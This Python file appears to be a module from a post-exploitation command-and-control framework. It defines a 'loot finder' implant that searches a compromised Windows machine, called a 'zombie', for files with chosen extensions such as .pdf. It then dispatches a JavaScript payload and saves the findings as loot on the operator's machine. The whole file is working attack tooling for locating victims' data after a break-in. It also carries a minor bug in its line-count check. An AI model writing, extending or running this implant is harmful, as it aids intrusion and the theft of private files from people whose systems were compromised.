import core.implant
import uuid

class LootFinderJob(core.job.Job):

    def done(self):
        self.display()

    def display(self):
        self.shell.print_good("Loot findings:")
        if self.data.splitlines() > 10:
            self.shell.print_warning("Lots of loot! Only printing first 10 lines...")
            self.shell.print_plain("\n".join(self.data.splitlines()[:10]))
        else:
            self.shell.print_plain(self.data)

        save_file = "/tmp/loot."+self.session.ip+"."+uuid.uuid4().hex
        with open(save_file, "w") as f:
            f.write(self.data)

        self.shell.print_good("Saved full loot list to "+save_file)

class LootFinderImplant(core.implant.Implant):

    NAME = "Find loot on the target box"
    DESCRIPTION = "Finds loot on the target box"
    AUTHORS = ["TheNaterz"]

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)
        self.options.register("LOOTDIR", "C:\\", "root directory to search for loot", required=True)
        self.options.register("LOOTEXTS", ".pdf, .xsl", "file extensions to search for", required=False)
        # will work on adding in filename support l8r
        # self.options.register("LOOTFILES", "", "specific filenames to search for", required=False)
        self.options.register("LOOTE", "", "string to send to zombie", hidden=True)
        self.options.register("LOOTD", "", "string to send to zombie", hidden=True)

    def run(self):

        # if not self.options.get("LOOTEXTS") and not self.options.get("LOOTFILES"):
        if not self.options.get("LOOTEXTS"):
            self.shell.print_error("Need to define extensions to look for!")
            # self.shell.print_error("Need to define extensions or filenames to look for!")
            return

        extension_list = "".join(self.options.get("LOOTEXTS").split()).split(",")
        self.options.set("LOOTE", " ".join(["\\\\"+x+"$" for x in extension_list]))

        if self.options.get("LOOTDIR")[-1] != "\\":
            self.options.set("LOOTDIR", self.options.get("LOOTDIR")+"\\")

        self.options.set("LOOTD", self.options.get("LOOTDIR").replace("\\", "\\\\"))

        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/gather/loot_finder.js", self.options)

        self.dispatch(payloads, LootFinderJob)
